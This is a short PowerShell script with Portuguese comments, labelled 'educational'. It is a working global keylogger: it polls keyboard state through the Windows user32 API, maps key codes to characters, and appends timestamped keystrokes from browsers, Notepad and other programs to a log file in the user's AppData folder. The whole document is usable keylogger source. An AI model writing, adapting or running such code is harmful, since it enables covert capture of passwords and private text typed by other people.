# Keylogger GLOBAL v1.0 - Captura WEB/Notepad/TUDO!
# EDUCACIONAL - Use com RESPONSABILIDADE
param($LogPath="$env:USERPROFILE\AppData\Local\keys-global.log")

Write-Warning "⚠️  EDUCACIONAL: Captura teclas GLOBALMENTE!"

# Cria log
New-Item -ItemType Directory -Force -Path (Split-Path $LogPath) | Out-Null

# Windows API NATIVE (48 bytes só!)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
"@

# Mapa teclas → chars (só alfanumérico)
$teclas = @{
    65='a';66='b';67='c';68='d';69='e';70='f';71='g';72='h';73='i';74='j';
    75='k';76='l';77='m';78='n';79='o';80='p';81='q';82='r';83='s';84='t';
    85='u';86='v';87='w';88='x';89='y';90='z';186=';';188=',';190='.';191='/';
    32=' ';13='[ENTER]';8='[BACKSPACE]'
}

Write-Host "🌐 KEYLOGGER GLOBAL ATIVO!" -ForegroundColor Red -BackgroundColor Black
Write-Host "📝 Log: $LogPath" -ForegroundColor Yellow
Write-Host "🖱️  TESTE: Digite no NAVEGADOR/Notepad (Ctrl+C parar)" -ForegroundColor Green
Write-Host "⏹️   Ctrl+C para PARAR" -ForegroundColor Magenta

$buffer = @()
$estadoAnterior = @{}

try {
    while($true) {
        foreach($vkCode in $teclas.Keys) {
            $estado = [WinAPI]::GetAsyncKeyState($vkCode)
            $pressionada = ($estado -band 0x8000)
            
            if($pressionada -and !$estadoAnterior[$vkCode]) {
                $char = $teclas[$vkCode]
                $buffer += $char
                Write-Host "[$char]" -ForegroundColor Cyan -NoNewline
                
                # Salva em ENTER ou 12+ chars
                if($char -eq '[ENTER]' -or $buffer.Count -ge 12) {
                    $texto = ($buffer -join '').Trim()
                    if($texto) {
                        "$(Get-Date -Format 'HH:mm:ss') → $texto" | Out-File $LogPath -Append -Encoding UTF8
                        Write-Host "`n📝 SALVO: $texto" -ForegroundColor Green
                    }
                    $buffer = @()
                }
            }
            $estadoAnterior[$vkCode] = $pressionada
        }
        Start-Sleep -Milliseconds 20
    }
} catch {
    Write-Host "`n🛑 PARADO!" -ForegroundColor Yellow
}
